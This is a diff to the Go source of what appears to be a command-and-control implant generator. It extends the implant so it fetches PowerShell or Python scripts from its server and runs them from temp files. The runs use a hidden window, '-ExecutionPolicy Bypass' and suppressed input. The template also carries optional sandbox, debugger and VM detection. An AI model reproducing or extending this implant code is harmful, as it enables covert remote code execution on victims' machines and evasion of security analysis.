@@ -356,28 +356,26 @@ go 1.21
 	env = append(env, "CGO_ENABLED=0")
 
 	// Download dependencies before building
-	// Only download if evasion features are enabled (they require golang.org/x/sys/windows)
-	if opts.Evasion != nil && (opts.Evasion.EnableSandboxDetection || opts.Evasion.EnableDebuggerCheck || opts.Evasion.EnableVMDetection) {
-		// First, try to get the required package which will update go.mod
-		g.logger.Debug("Downloading Go dependencies...")
-		getCmd := exec.Command("go", "get", "golang.org/x/sys/windows@latest")
-		getCmd.Dir = tmpDir
-		getCmd.Env = env
-		var modStderr bytes.Buffer
-		getCmd.Stderr = &modStderr
-		if err := getCmd.Run(); err != nil {
-			return nil, fmt.Errorf("failed to download dependencies: %w\nStderr: %s", err, modStderr.String())
-		}
-		
-		// Then run go mod tidy to ensure everything is correct
-		tidyCmd := exec.Command("go", "mod", "tidy")
-		tidyCmd.Dir = tmpDir
-		tidyCmd.Env = env
-		tidyCmd.Stderr = &modStderr
-		if err := tidyCmd.Run(); err != nil {
-			// Non-fatal - continue if tidy fails
-			g.logger.Debug("go mod tidy had warnings: %s", modStderr.String())
-		}
+	// Always download golang.org/x/sys/windows for Windows payloads (needed for SysProcAttr.HideWindow)
+	// Also download if evasion features are enabled (they require unsafe and windows)
+	g.logger.Debug("Downloading Go dependencies...")
+	getCmd := exec.Command("go", "get", "golang.org/x/sys/windows@latest")
+	getCmd.Dir = tmpDir
+	getCmd.Env = env
+	var modStderr bytes.Buffer
+	getCmd.Stderr = &modStderr
+	if err := getCmd.Run(); err != nil {
+		return nil, fmt.Errorf("failed to download dependencies: %w\nStderr: %s", err, modStderr.String())
+	}
+	
+	// Then run go mod tidy to ensure everything is correct
+	tidyCmd := exec.Command("go", "mod", "tidy")
+	tidyCmd.Dir = tmpDir
+	tidyCmd.Env = env
+	tidyCmd.Stderr = &modStderr
+	if err := tidyCmd.Run(); err != nil {
+		// Non-fatal - continue if tidy fails
+		g.logger.Debug("go mod tidy had warnings: %s", modStderr.String())
 	}
 
 	// Determine output name
@@ -552,10 +550,11 @@ import (
 	"runtime"
 	"strings"
 	"sync"
+	"syscall"
 	"time"{{if and .Evasion (or .Evasion.EnableSandboxDetection .Evasion.EnableDebuggerCheck .Evasion.EnableVMDetection)}}
-	"unsafe"
+	"unsafe"{{end}}
 	
-	"golang.org/x/sys/windows"{{end}}
+	"golang.org/x/sys/windows"
 )
 
 const (
@@ -1068,13 +1067,19 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 		params = make(map[string]string)
 	}
 	
-	// For PowerShell modules, execute via PowerShell.exe dynamically
+	// For PowerShell and Python modules, execute via their respective interpreters dynamically
 	// This allows modules to be executed without embedding them in the payload
-	if strings.Contains(moduleID, "powershell/") {
-		// This is a PowerShell module - we need to fetch and execute it
+	if strings.Contains(moduleID, "powershell/") || strings.Contains(moduleID, "python/") {
+		// This is a PowerShell or Python module - we need to fetch and execute it
 		// For now, send a request to the server to get the module script
+		isPowerShell := strings.Contains(moduleID, "powershell/")
+		isPython := strings.Contains(moduleID, "python/")
 		{{if .Debug}}
-		fmt.Printf("[DEBUG] PowerShell module detected, fetching script from server\n")
+		if isPowerShell {
+			fmt.Printf("[DEBUG] PowerShell module detected, fetching script from server\n")
+		} else if isPython {
+			fmt.Printf("[DEBUG] Python module detected, fetching script from server\n")
+		}
 		{{end}}
 		
 		// Request module script from server with task ID to get parameters
@@ -1125,11 +1130,20 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 		// Script already includes script_end with parameters substituted server-side
 		// No need to append parameters again - just write the script as-is
 		
-		// Execute PowerShell script
+		// Execute PowerShell or Python script
 		// Use temp file approach to avoid command line length limits
-		tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("ditto_%d.ps1", time.Now().UnixNano()))
+		var tmpFile string
+		var fileExt string
+		if isPowerShell {
+			fileExt = ".ps1"
+			tmpFile = filepath.Join(os.TempDir(), fmt.Sprintf("ditto_%d.ps1", time.Now().UnixNano()))
+		} else if isPython {
+			fileExt = ".py"
+			tmpFile = filepath.Join(os.TempDir(), fmt.Sprintf("ditto_%d.py", time.Now().UnixNano()))
+		}
+		
 		{{if .Debug}}
-		fmt.Printf("[DEBUG] Writing PowerShell script to temp file: %s\n", tmpFile)
+		fmt.Printf("[DEBUG] Writing %s script to temp file: %s\n", strings.ToUpper(fileExt[1:]), tmpFile)
 		{{end}}
 		
 		// Write script to temp file
@@ -1146,29 +1160,76 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 			{{end}}
 		}()
 		
-		// Execute PowerShell script file with timeout
-		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-File", tmpFile)
-		
+		// Execute script file with timeout
 		// Create context with timeout (60 seconds for module execution)
 		ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
 		defer cancel()
 		
-		cmd = exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-File", tmpFile)
+		var cmd *exec.Cmd
+		if isPowerShell {
+			cmd = exec.CommandContext(ctx, "powershell.exe", 
+				"-NoProfile", 
+				"-NonInteractive", 
+				"-NoLogo",
+				"-WindowStyle", "Hidden",
+				"-ExecutionPolicy", "Bypass", 
+				"-File", tmpFile)
+		} else if isPython {
+			// Try to find Python interpreter: python.exe, py.exe, or python3
+			var pythonCmd string
+			var pythonArgs []string
+			
+			if path, err := exec.LookPath("python.exe"); err == nil {
+				pythonCmd = path
+				pythonArgs = []string{tmpFile}
+			} else if path, err := exec.LookPath("py"); err == nil {
+				pythonCmd = path
+				pythonArgs = []string{"-3", tmpFile} // Use py launcher with -3 flag for Python 3
+			} else if path, err := exec.LookPath("python3"); err == nil {
+				pythonCmd = path
+				pythonArgs = []string{tmpFile}
+			} else {
+				sendResult("module", taskID, "Error: Python interpreter not found. Please ensure Python is installed and in PATH.")
+				return
+			}
+			
+			cmd = exec.CommandContext(ctx, pythonCmd, pythonArgs...)
+		}
+		
+		// Redirect stdin to prevent interpreter from waiting for input
+		cmd.Stdin = bytes.NewReader([]byte{})
+		
+		// Hide window on Windows to prevent hanging
+		cmd.SysProcAttr = &syscall.SysProcAttr{
+			HideWindow: true,
+		}
 		
 		{{if .Debug}}
-		fmt.Printf("[DEBUG] Executing PowerShell script with 60s timeout...\n")
+		if isPowerShell {
+			fmt.Printf("[DEBUG] Executing PowerShell script with 60s timeout...\n")
+		} else if isPython {
+			fmt.Printf("[DEBUG] Executing Python script with 60s timeout...\n")
+		}
 		{{end}}
 		
 		output, err := cmd.CombinedOutput()
 		
 		{{if .Debug}}
 		if ctx.Err() == context.DeadlineExceeded {
-			fmt.Printf("[DEBUG] PowerShell execution timed out after 60 seconds\n")
+			if isPowerShell {
+				fmt.Printf("[DEBUG] PowerShell execution timed out after 60 seconds\n")
+			} else if isPython {
+				fmt.Printf("[DEBUG] Python execution timed out after 60 seconds\n")
+			}
 		}
 		if err != nil {
-			fmt.Printf("[DEBUG] PowerShell execution error: %v\n", err)
+			if isPowerShell {
+				fmt.Printf("[DEBUG] PowerShell execution error: %v\n", err)
+			} else if isPython {
+				fmt.Printf("[DEBUG] Python execution error: %v\n", err)
+			}
 		}
-		fmt.Printf("[DEBUG] PowerShell output length: %d bytes\n", len(output))
+		fmt.Printf("[DEBUG] Output length: %d bytes\n", len(output))
 		{{end}}
 		
 		if err != nil {
@@ -1202,8 +1263,8 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 		sendResult("module", taskID, "Module function not found")
 	}
 	{{else}}
-	// No modules embedded and not PowerShell - module not available
-	sendResult("module", taskID, "Module not available (not PowerShell and not embedded)")
+	// No modules embedded and not PowerShell/Python - module not available
+	sendResult("module", taskID, "Module not available (not PowerShell/Python and not embedded)")
 	{{end}}
 }
 
